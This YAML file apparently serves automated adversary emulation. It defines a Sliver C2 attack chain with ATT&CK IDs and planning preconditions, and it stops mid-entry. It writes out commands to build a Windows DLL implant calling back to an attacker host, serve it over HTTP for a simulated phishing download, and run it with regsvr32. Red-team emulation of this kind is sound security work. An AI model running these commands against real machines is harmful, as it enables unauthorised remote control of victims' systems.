attack_action_sequence:
  - uuid: sliver-payload-windows-dll
    name: Build DLL Sliver implant
    id:
      - T1071.001
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
    execution:
      executor: Sliver Console
      command: |
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shared --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        required: true
      LPORT:
        default:
        description: listening port of the attacter machine
        required: true
      SAVE_PATH:
        default:
        description: Saved path of the generated payload
        required: true
        pddl_index: string0
    preconditions:
      - (os-windows ?target - host)
    effects:
      - (sliver_implant_payload ?p - payload ?target - host)
      - (file_payload ?p - payload ?file - file)
      - (dll_file ?file - file)
      - (file_prepared_local ?path - string ?file - file)
  - uuid: simulate-download-file
    name: Simulate the victim download a file on its machine
    id:
      - T1566.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Initial Access
    technique:
      - 'Phishing: Spearphishing Link'
    description: This step simulates the victim accidentally downloads a malicious
      file by clicking a link.
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server #{LPORT}

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the file on the attacker's machine
        3. Download the file to #{PATH}
    arguments:
      LHOST:
        default:
        description: IP address of the http file server (typically the attacker machine)
        type:
        required: true
      LPORT:
        default: 8000
        description: port of the http file server
        type:
        required: true
      SAVE_PATH:
        default:
        description: Saved path of the downloaded payload
        required: true
        pddl_index: string4
    preconditions:
      - (allow-simulate-user-action ?t - host)
      - operator: or
        operands:
          - (os-linux ?t - host)
          - (os-windows ?t - host)
          - (os-macos ?t - host)
      - (file_prepared_local ?localpath - string ?file - file)
    effects:
      - (file_exists ?path - string ?file - file ?t - host)
  - uuid: simulate-execute-dll-windows
    name: Simulate the victim execute a DLL file on its machine
    id:
      - T1204.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - 'User Execution: Malicious File'
    description: This step simulates the victim executes a DLL file on its machine.
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On victim's machine, use PowerShell or Command Prompt)
        regsvr32 #{DLL_PATH}
    arguments:
      DLL_PATH:
        default:
        description: Saved path of the DLL file
        required: true
        pddl_index: string4
    preconditions:
      - (allow-simulate-user-action ?t - host)
      - (os-windows ?t - host)
      - (file_exists ?path - string ?file - file ?t - host)
      - (dll_file ?file - file)
    effects:
      - (file_executed ?file - file ?t - host)
  - uuid: execute-sliver-payload-file
    name: Execute a Sliver Implant Payload
    id:
      - T1071.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      Executing a Sliver implant payload will establish a Sliver session.
    execution:
      executor: None
      command: |
        None
    arguments:
    preconditions:
      - (sliver_implant_payload ?p - payload ?t - host)
      - (file_payload ?p - payload ?f - file)
      - (file_executed ?f - file ?t - host)
    effects:
      - (sliver_session ?s - executor ?t - host)
      - operator: When
        params:
          condition: (file_executed_as_root ?f - file ?t - host)
          effect: (elevated_executor ?s - executor)
  - uuid: sliver-whoami
    name: User Context Verification
    id:
      - T1087.001
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Discovery
    technique:
      - |
        Account Discovery: Local Account
    description: The `whoami` command retrieves the current user identity of the system.
      It executes the command on the remote system and returns the username of the
      account that is currently logged in. This command includes flag for setting
      a timeout.
    execution:
      executor: Sliver Executor
      command: whoami(#{Executor})
    arguments:
      Executor:
        description: The session ID of the active Sliver connection.
        required: true
        pddl_index: executor0
    preconditions:
      - operator: or
        operands:
          - (os-windows ?target - host)
          - (os-linux ?target - host)
          - (os-macos ?target - host)
      - (sliver_session ?executorID - executor ?target - host)
    effects:
      - (local_account_info ?target - host)
  - uuid: sliver-get_env
